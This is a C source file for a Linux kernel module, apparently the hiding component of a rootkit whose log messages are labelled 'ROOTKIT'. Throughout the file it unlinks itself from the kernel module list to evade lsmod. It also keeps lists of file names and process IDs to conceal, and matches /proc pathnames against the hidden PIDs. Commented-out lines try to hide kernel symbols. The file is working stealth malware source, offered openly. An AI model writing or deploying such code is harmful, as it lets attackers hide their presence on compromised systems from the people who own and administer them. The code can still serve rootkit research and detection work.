#include <linux/module.h> //THIS_MODULE, also includes list.h
#include <linux/slab.h>		// kmalloc()

#include "hiding.h"

struct list_files_node{
	struct list_head list; // prev and next
	char* name;
};

struct list_pids_node{
	struct list_head list;
	int pid;
};

struct list_head list_files = LIST_HEAD_INIT(list_files);
struct list_head list_pids = LIST_HEAD_INIT(list_pids);


int module_hidden = 0;
static struct list_head* prev_module;
unsigned int num_symtab_old;

int is_module_hidden(void){
    return module_hidden;
}

int hide_module(void){
	if (module_hidden)
		return -1;
	// Hide from /proc/modules (therefore from lsmod)
	// We just delete the module from the list
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	// Hide from /proc/kallsyms NOTE: it seems that hiding from /proc/modules also hides from kallsym??
	// We set num_symtab to 0 so that this if in module_get_kallsyms never succeeds:
	// https://elixir.bootlin.com/linux/v5.4.6/source/kernel/module.c#L4198
	//num_symtab_old = THIS_MODULE->kallsyms->num_symtab; // TESTING
	//log(KERN_INFO "ROOTKIT: %d\n", num_symtab_old);
	//THIS_MODULE->kallsyms->num_symtab = 0; // TESTING

	//kobject_del(&THIS_MODULE->mkobj.kobj); //TESTING
	module_hidden = 1;
	return 0;
}

int unhide_module(void){
	if (!module_hidden)
		return -1;
	list_add(&THIS_MODULE->list, prev_module); //adds the module after the module which was prev to it
	//maybe we all die if this prev is not in the list anymore

	//THIS_MODULE->kallsyms->num_symtab = num_symtab_old; // TESTING

	module_hidden = 0;
	return 0;
}

// DELETE LISTS
void delete_pids_node(struct list_pids_node* node){
    list_del(&node->list);
    kfree(node);
}

void delete_files_node(struct list_files_node* node){
    list_del(&node->list);
    kfree(node->name);
    kfree(node);
}

void delete_lists(void){
	struct list_pids_node *node_pid, *tmp_pid;
    struct list_files_node *node_file, *tmp_file;
    list_for_each_entry_safe(node_pid, tmp_pid, &list_pids, list)
        delete_pids_node(node_pid);
    list_for_each_entry_safe(node_file, tmp_file, &list_files, list)
        delete_files_node(node_file);
}

// HIDE THOSE FILES
int is_file_hidden(const char* name){
	struct list_files_node* node;
	list_for_each_entry(node, &list_files, list){
		if (strcmp(node->name, name) == 0)
			return 1;
	}
	return 0;
}

int hide_file(const char* name){
	if (is_file_hidden(name)){
		log(KERN_INFO "ROOTKIT: ERROR trying to hide already hidden file %s\n", name);
		return -1;
	}

	struct list_files_node* node = kmalloc(sizeof(struct list_files_node), GFP_KERNEL);
	if (node == NULL){
		log(KERN_INFO "ROOTKIT: ERROR allocating node for hiding file %s\n", name);
		return -1;
	}

	node->name = kmalloc(strlen(name)+1, GFP_KERNEL);
	if (node->name == NULL){
		log(KERN_INFO "ROOTKIT: ERROR allocating node name for hiding file %s\n", name);
		kfree(node);
		return -1;
	}

	strcpy(node->name, name);
	list_add(&node->list, &list_files);
	log(KERN_INFO "ROOTKIT: Hidden file %s\n", name);
	return 0;
}

int unhide_file(const char* name){
	struct list_files_node *node, *tmp;
	list_for_each_entry_safe(node, tmp, &list_files, list){
		if (strcmp(node->name, name) == 0){
			log(KERN_INFO "ROOTKIT: Unhidden file %s\n", name);
			delete_files_node(node);
			return 0;
		}
	}
	log(KERN_INFO "ROOTKIT: ERROR trying to unhide not found file %s\n", name);
	return -1;
}

// HIDE THOSE PIDS
int is_pid_hidden(int pid){
	struct list_pids_node* node;
	list_for_each_entry(node, &list_pids, list){
		if (node->pid == pid)
			return 1;
	}
	return 0;
}

const char* my_basename(const char __user* pathname){
	// Examples: proc/ /proc proc proc/pepe /proc/
	int len = strlen(pathname);
	const char __user* basename = pathname;
	for (int i = 0; i < len-1; i++)
		if (pathname[i] == '/')
			basename = pathname+i+1;

	len = strlen(basename);
	char* result = kmalloc(len+1, GFP_KERNEL);
	memcpy(result, basename, len+1);
	if (result[len-1] == '/') //delete / on last character
		result[len-1] = '\x00';

	return result;
}

int pathname_includes_pid(const char* pathname){
    struct list_pids_node* node;
	char pid_str[8];
	char pid_str2[9];
	const char* filename;
	list_for_each_entry(node, &list_pids, list){
		snprintf(pid_str, sizeof(pid_str), "%d", node->pid);
		snprintf(pid_str2, sizeof(pid_str2), "%d/", node->pid);
		filename = my_basename(pathname);
		if (strcmp(pid_str, filename) == 0 || strstr(pathname, pid_str2) != NULL){
			kfree(filename);
			return node->pid;
		}
		kfree(filename);
	}
	return 0;
}

int hide_pid(int pid){
	if (is_pid_hidden(pid)){
		log(KERN_INFO "ROOTKIT: ERROR trying to hide already hidden pid %d\n", pid);
		return -1;
	}

	struct list_pids_node* node = kmalloc(sizeof(struct list_pids_node), GFP_KERNEL);
	if (node == NULL){
		log(KERN_INFO "ROOTKIT: ERROR allocating node for hiding pid %d\n", pid);
		return -1;
	}

	node->pid = pid;
	list_add(&node->list, &list_pids);
	log(KERN_INFO "ROOTKIT: Hidden PID %d\n", pid);
	return 0;
}

int unhide_pid(int pid){
	struct list_pids_node *node, *tmp;
	list_for_each_entry_safe(node, tmp, &list_pids, list){
		if (node->pid == pid){
			log(KERN_INFO "ROOTKIT: Unhidden PID %d\n", pid);
			delete_pids_node(node);
			return 0;
		}
	}
	log(KERN_INFO "ROOTKIT: ERROR trying to unhide not found pid %d\n", pid);
	return -1;
}

// PRINT HIDDEN
void print_hidden(void){
    log(KERN_INFO "ROOTKIT: Hidden files: ");
    struct list_files_node* node_file;
    struct list_pids_node* node_pid;
    list_for_each_entry(node_file, &list_files, list){
        log(KERN_CONT "%s, ", node_file->name);
    }
    log(KERN_CONT "\n");
    log(KERN_INFO "ROOTKIT: Hidden pids: ");
    list_for_each_entry(node_pid, &list_pids, list){
        log(KERN_CONT "%d, ", node_pid->pid);
    }
    log(KERN_CONT "\n");
}
